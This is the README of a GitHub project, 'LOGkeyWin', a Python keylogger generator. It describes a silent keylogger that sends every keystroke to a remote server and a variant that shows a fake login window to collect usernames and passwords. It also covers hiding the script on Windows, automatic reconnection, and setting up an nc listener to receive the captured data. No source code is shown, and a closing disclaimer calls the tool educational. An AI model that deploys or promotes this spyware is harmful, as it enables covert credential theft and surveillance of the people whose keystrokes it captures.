# LOGkeyWin 
# 🔑 Keylogger 🔑

## Overview

The Keylogger Application is a Python-based tool that functions in two modes:
1. Silent Keylogger: Captures keystrokes and sends them to a remote server in the background.
2. Keylogger with Login Application: Provides a GUI login interface along with keystroke logging.

The application supports automatic reconnection to the server if the connection fails and can hide itself on Windows by setting specific file attributes.

## Features

- Silent Keylogger: Runs silently in the background and logs all keystrokes.
- GUI Login Application: Displays a login interface where users can input their username and password.
- Automatic Reconnection: Reconnects to the server every 5 seconds if the connection is lost.
- Self-Hiding Functionality: On Windows, the script can hide itself using file attributes.

## Requirements

- Python 3.x: Ensure Python is installed on your system.
- Python Packages:
  - `pynput`: For capturing keyboard events.
  - `tkinter`: For the graphical user interface (GUI) in the login application.
  - `socket`: For network communication.
  - `subprocess`: For executing system commands.

## Installation

1. Clone the Repository:
   ```bash
   git clone https://github.com/POWERHSado/LOGkeyWin.git
   cd LOGkeyWin
   ```
2. Install Required Python Packages:
   ```bash
   pip install -r requirements.txt
3. Using the Generator
   ```bash
   bash gen.sh

   
## Usage

### Running the Setup Script

1. **Select the Application Type:**
   When you run the setup script, you'll be prompted to choose between:
   - Silent Keylogger
   - Keylogger with Login Application

2. **Enter the Server Details:**
   Provide the IP address and port of the server where the keystrokes will be sent.

3. **Enter the Output File Name:**
   Specify the name of the output file where the Python code will be saved.

### Silent Keylogger

The Silent Keylogger script will:
- Connect to the specified server.
- Log all keystrokes and send them to the server.
- Automatically reconnect to the server if the connection fails.

### Keylogger with Login Application

The Keylogger with Login Application script will:
- Display a login window with fields for username and password.
- Capture and send keystrokes to the server.
- Provide an interface to input and submit login credentials.

## Setup Listener with `nc`

To set up a listener that can receive the keystrokes sent by the keylogger, you can use `nc` (netcat), a versatile networking utility. Follow these steps to configure and run a listener on your server:

### Prerequisites

- Ensure `nc` (netcat) is installed on your server. You can install it using the package manager for your operating system:
  - **For Debian/Ubuntu:**
    ```bash
    sudo apt-get install netcat
    ```
  - **For Red Hat/CentOS:**
    ```bash
    sudo yum install nc
    ```
  - **For macOS:**
    ```bash
    brew install netcat
    ```

### Running the Listener

1. **Open a Terminal:**
   Access the terminal on your server where you want to listen for incoming connections.

2. **Start the Netcat Listener:**
   Run the following command to start listening on the port where the keylogger will send data. Replace `<PORT>` with the port number specified in your keylogger configuration.
   ```bash
   nc -l -p <PORT>


## Disclaimer

This application is intended for educational purposes only. The creators and developers of this tool are not responsible for any misuse or illegal activities resulting from its use. Ensure you use this software responsibly and in compliance with all applicable local laws and regulations regarding keyloggers and data privacy.

**Created by ZA0infinity**


